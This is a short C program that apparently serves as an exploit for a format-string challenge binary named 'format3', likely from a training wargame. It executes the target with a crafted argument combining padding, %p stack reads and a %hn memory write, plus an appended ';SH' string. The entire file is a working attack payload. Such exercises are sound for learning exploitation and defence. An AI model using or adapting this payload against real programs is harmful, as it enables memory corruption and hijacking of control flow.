#include <sys/types.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>


int main()
{
	char * argv[] = {"./format3","%2303189p%p%p%p%p%p%p%p%p%p%hn;SH", NULL};
	execvp(argv[0], argv);

	return 0;
}

